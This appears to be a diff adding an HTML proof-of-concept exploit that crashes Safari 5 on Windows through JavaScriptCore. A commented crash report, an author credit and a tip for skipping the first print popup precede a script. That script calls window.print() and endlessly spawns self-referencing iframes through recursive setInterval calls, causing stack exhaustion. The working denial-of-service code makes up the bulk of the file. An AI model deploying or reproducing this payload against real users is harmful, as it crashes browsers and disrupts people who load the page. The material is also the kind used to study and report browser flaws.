@@ -1,0 +1,46 @@
+<html>
+
+<---------------------
+Crash Report
+
+  Problem Event Name:   APPCRASH
+  Application Name:     Safari.exe
+  Application Version:  5.31.22.7
+  Application Timestamp:        4b8f94fa
+  Fault Module Name:    JavaScriptCore.dll
+  Fault Module Version: 5.31.22.5
+  Fault Module Timestamp:       4b8cb88c
+  Exception Code:       c00000fd
+  Exception Offset:     000889f7
+  OS Version:   6.1.7600.2.0.0.256.48
+  Locale ID:    1053
+  Additional Information 1:     d4bb
+  Additional Information 2:     d4bb5342a8501f1ef1ad79845414ed25
+  Additional Information 3:     57f4
+  Additional Information 4:     57f4717a3dd18c61a213b49009cb5bb7
+
+Tested on: Microsoft Windows 7
+By: Mathias Karlsson
+URL: http://h.ackack.net/
+
+Note:
+If you set the iframe src property to an external document containing the window.print(), the user does not have to press away the first print popup.
+
+---------------------->
+
+<script>
+window.print();
+a();
+function a()
+{
+        setInterval(b,0);
+}
+function b()
+{
+        var c = document.createElement("iframe");
+        c.setAttribute("src",document.location);
+        document.getElementsByTagName("body")[0].appendChild(c);
+        setInterval(a,0);
+}
+</script>
+</html>
